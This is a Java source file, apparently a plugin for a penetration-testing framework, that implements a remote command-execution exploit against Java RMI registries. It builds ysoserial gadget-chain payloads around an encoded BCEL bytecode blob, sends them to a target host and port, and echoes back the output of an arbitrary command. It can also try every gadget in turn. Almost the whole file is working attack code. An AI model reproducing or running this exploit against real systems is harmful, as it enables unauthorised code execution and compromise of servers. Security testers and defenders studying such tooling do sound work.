package me.gv7.woodpecker.plugin.exploit;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class RmiDeserialExecExploit implements IExploit {
    private final static String EchoExecBCEL = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dT$d9R$TA$U$3dM$96$Z$9aQ0$nh$c4$j$95$b0$84$b8$_$e0$c6$ea$WP$Z$E$e3$3e$9940Jf$e2dF$a5$caO$f0$dd$f2$LxQ$8b$w$ab$S$cb$94$fa$e6$83_$e2W$a8$b7C$d8$U$zg$aa$ba$fb$9e$db$7d$97so$f7$b7$l$l$3f$D8$8ci$F$dd$i$MI$F$3d$wR$i$87p$98$p$80$p$w$8e$ca$f9$98$8a$e3$wN$a88$a9$e2$U$c7i$f4$ca$a1O$c1$Z$Fg9$ce$e1$3cG$T$$p4$a2_$8a$D$K$G9bHJdH$ae$86U$8c$c8$f9$a2$82K$i$ad$b8$cc$b1$PI$VW8$f6$e2$aaD$d2$KF$V$8c1$E$5c$dff8$98H$3f2$9e$g$a99$c3$9eI$e9$9ek$d93$7d$j$7fB$M$c1A$t$t$Y$g$d3$96$z$c6$fc$7cV$b8$TFv$8e$90$f0$Z$cb$b6$bcs$M$b1$8dLM2$f0$e1$e7$a6$ux$96c$XI$d0$j$df5$c5$88$r$8fn$k$b3$i$dd1$l$L$afG$9ed$88V$N$f8$9e5$97$eaw$5dc$3em$V$3d$N$ed$b8$c6$d0$f4$bbm$G$c5$v$f6$d8F$5e$u$b8$ae$e1$G$f6k$Y$87N$89$3d$b3l$N$T$b8IK3$9fc$a8K$99$U$7f$d6$u$ce$d2$3ai$w$98$d40$85$5b$g2$b8$cd$d0R5l9$a9$B$7fzZ$b8$o7$$$8c$9cp$Z$e2$cb$8a$cbv$c1$f7$c8$a90$f2K$3a$Fw4$dc$c5$3d$Z$da$7d9$3c$d0$f0$Q$f7$Y$b6$fe$k$e4$80o$cd$d1$B$N$Gt$NYP$m$8ck$c8$c98$a3$ab$9bW$Y$d2$m$aa$v$b4$b5$b5ih$93$v$b5$p$c1P$bfB$d4$3a$o$aee$l$J$93$a0$40B$f2$bc$96$a1$f9$a2$t$f2$M$N3$c2$bb$ee$3a$F$e1z$f3$qyN$day$s$dcA$a3H$e47$t6$ac$b3j$3a$b6gX$b2V$adk$L$3a8k$b8$bax$e2$L$db$U$7d$j$c4$db$96U$dd$b8o$7bV$9elr$f2$b7$o$c4$d69$a8$c1$b2$93$c4sA$3c$q$Sw$fe$ddz$U$b8$v$8a$c5$beu$aej$m$f5$O$b9ZS$Y$e2$7e$d9$dd$fa$8a$d1$f1m$89$N$V$92$b3$e8$aaj$a9$b4UT$da$kv$5d$c7$5d$b6$ad$d2$94$93$9dO$edn$U$K$c2$a6$aeJ$fe$d7$cd$a95$80$q$d6s$96$hW$d24JY$Y3$82$ae$e5$5e$ba$a2$f2$ab$a3$97$81JN$e3$B$80$b5$o$E$95$d0$f7$V$b0L$ZuS$e1O$I$8cF$82$l$Q$w$n$iQJP_$a3$a9$3b$Q$a9$d7$bb$83$R$ae$_$60$T$J$NR$d0$f4$eeP$97$fe$81$80$S$5d$b1$K$g3$V4e$92$rl$v$pRF$b47$b8$Gk$aea$a1$Kb$e4$a7$a57$i$P$96$b05$d3$ab$7cE4$k$8e$93$a3m$918$NS$L$3f$bf$c7C$7fW$85K$d8$be8J$$w$yR$K$c0$h$bc$a5$e7$86$5e$YZ$8f$nJ$a3J$7f$3d6$81c$t$g$ui$N$9d$d8$8c$U$bd$5d$c7$Q$c1$v$das$B$cdtqc$98E$L$9e$m$8e$X$d8$8e$97$b4$fb$Vva$81$88zK$a7$de$RIL$5e$L$o$8c$88$c2$Q$RUGs$a2$b3$8c$9d$V$b4fj$89DvQd$9d$5d$r$ec$96aJ$81$C$yc$cf$X$da$bb$U$V$af$9ekG$90lu$d0$wH$b8$8c$b8$b3Z$8c$ae_$r$9c$ea7$b7$F$A$A";
    @Override
    public String getExploitTabCaption() {
        return "command exec";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder argsUsageBinder = JavaRMIVulPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> argsList = new ArrayList<IArg>();

        IArg args = JavaRMIVulPlugin.pluginHelper.createArg();
        args.setDescription("命令");
        args.setRequired(true);
        args.setDefaultValue("whoami");
        args.setName("command");
        argsList.add(args);


        IArg gadget = JavaRMIVulPlugin.pluginHelper.createArg();
        gadget.setDescription("ysoserial gadget");
        gadget.setRequired(true);
        gadget.setDefaultValue("all");
        gadget.setName("gadget");
        argsList.add(gadget);

        argsUsageBinder.setArgsList(argsList);
        return argsUsageBinder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, Object> map, IResultOutput result) {
        String host = target.getHost();
        int port = target.getPort();
        String gadget = (String)map.get("gadget");
        String command = (String)map.get("command");

        if(gadget.equals("all")) {
            for (String gg : JavaRMIVulPlugin.gadgets) {
                String res = doEchoExploig(host,port,gg,command);
                if(res != null){
                    result.successPrintln(String.format("gadget: %s command: %s",gg,command));
                    result.rawPrintln(res+"\n\n");
                }else{
                    result.failPrintln(String.format("gadget: %s command: %s",gg,command));
                }
            }
        }else{
            String res = doEchoExploig(host,port,gadget,command);
            if(res != null){
                result.successPrintln(String.format("gadget: %s command: %s",gadget,command));
                result.rawPrintln(res+"\n\n");
            }else{
                result.failPrintln(String.format("gadget: %s command: %s",gadget,command));
            }
        }
    }

    public String doEchoExploig(String host,int port,String gadget,String command){
        String res = null;
        try {
            Object objPayload = CommonUtil.generator(gadget, String.format("bcel_with_args:%s|%s", EchoExecBCEL,command));
            res = RMIRegistryExploit.sendPayload(host, port, objPayload);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return res;
    }
}
